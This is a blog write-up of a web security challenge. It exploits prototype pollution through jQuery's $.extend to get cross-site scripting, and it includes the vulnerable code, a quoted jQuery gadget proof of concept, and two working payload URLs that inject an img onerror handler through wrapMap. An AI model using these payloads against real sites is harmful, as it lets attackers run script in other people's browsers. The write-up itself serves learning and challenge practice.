---
layout: post
title:  "alert 1337 - jquery prototype pollution"
---

# alert 1337 - jquery prototype pollution

challenge here 
https://msrkp.github.io/

code
```
<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
<script>
	var HoF = {0:"@st98_",1: "@SecurityMB",3:"@0xParrot",4:"@pgt_r2ursystem",5:"You ?"};
	
	function escapeHTML(input){
		return input.replace(/</g,'&lt;').replace(/>/g,'&gt;')
	}
	var params = new URLSearchParams(window.location.search);
	var name = params.get('name');
	var paramsJson = $.extend(true, HoF, JSON.parse(name));
	$.each(paramsJson,function(key,value){
		$(`<li id='name'>${escapeHTML(value)}</li>`).appendTo('#HoF')
	});
</script>
```

The code is simple. `$.extend` is used. So there is prototype pollution. We need to use it.

First, I thought the challenge is to use pp to bypass `escapeHTML`. So I spend hours trying to figure out how do pp the function. But no luck. I even thought that I can use `}` to pair with the `${`.

After some rest. I checked this git. `https://github.com/BlackFan/client-side-prototype-pollution`

Here we can find many poc about pp. Since the code here is jQuery, I'll try to figure out how the payloads works.

I choose this one. `https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md`

```
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script> 
  Object.prototype.url = ['data:,alert(1)//'];   
  Object.prototype.dataType = 'script';
</script>      
<script>
  $.get('https://google.com/'); 
  $.post('https://google.com/'); 
</script>
```
After debugging it, I know that we need to pp jquery functions. So my thoughts were wrong.
So I try to debug again. Line by line. Try to find out what to pp.

in function `buildFragment`,
```
} else {
				tmp = tmp || safe.appendChild( context.createElement( "div" ) );

				// Deserialize a standard representation
				tag = ( rtagName.exec( elem ) || [ "", "" ] )[ 1 ].toLowerCase();
				wrap = wrapMap[ tag ] || wrapMap._default;

				tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];
```

We can pp wrapMap. So our evil code can be injected into tmp.
`tag` is `li`, `li` not in `wrapMap`. So after our pp, `wrapMap['li']` is what we control.
Then we can control `wrap[1]`. Then `tmp.innerHTML`. In the end, we get the alert.
```https://msrkp.github.io/?name={%22__proto__%22:{%22li%22:{%221%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```
And this one.
```https://msrkp.github.io/?name={%22__proto__%22:{%22li%22:{%222%22:%22%3Cimg%20src%20onerror=alert(1337)%3E%22}},%22length%22:1}```


